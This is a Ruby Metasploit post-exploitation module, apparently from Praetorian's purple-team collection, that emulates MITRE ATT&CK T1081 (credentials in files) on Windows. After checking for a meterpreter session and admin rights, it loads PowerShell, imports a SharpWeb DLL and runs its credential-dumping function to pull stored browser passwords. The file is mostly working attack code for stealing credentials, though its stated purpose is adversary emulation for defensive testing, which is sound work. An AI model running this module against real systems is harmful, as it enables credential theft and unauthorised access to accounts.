##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::Priv

  def initialize(info={})
    super(update_info(info,
                      'Name'          => 'Credentials in Files (T1081) Windows - Purple Team',
                      'Description'   => %q{
                        Collection:
                        Adversaries may search local file systems and remote file shares for files containing passwords. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.
It is possible to extract passwords from backups or saved virtual machines through Credential Dumping. Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller. This module uses SharpWeb to exectract credentials. },
                      'License'       => MSF_LICENSE,
                      'Author'        => [ 'Praetorian' ],
                      'References'    => [ [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1081'],
                        [ 'URL', 'https://github.com/djhohnstein/SharpWeb'] ],
                      'Platform'      => [ 'win' ],
                      'SessionTypes'  => [ 'meterpreter' ]
                     ))
  end


  def run
    begin
      raise "Module requires meterpreter session" if session.type != "meterpreter"
      raise "Module requires admin" unless is_admin?


      print_status("loading powershell...")
      client.run_cmd("load powershell")
      print_status("importing module...")
      client.run_cmd("powershell_import data/purple/t1081/sharpweb.dll")
      print_status("Executing SharpDPAPI \"machinecredentials\"...")
      client.run_cmd("powershell_execute [SharpWeb.Program]::creds()")

      print_good("Module T1081W execution successful.")

    rescue ::Exception => e
      print_error("#{e.class}: #{e.message}")
      print_error("Module T1081W execution failed.")
    end

  end
end
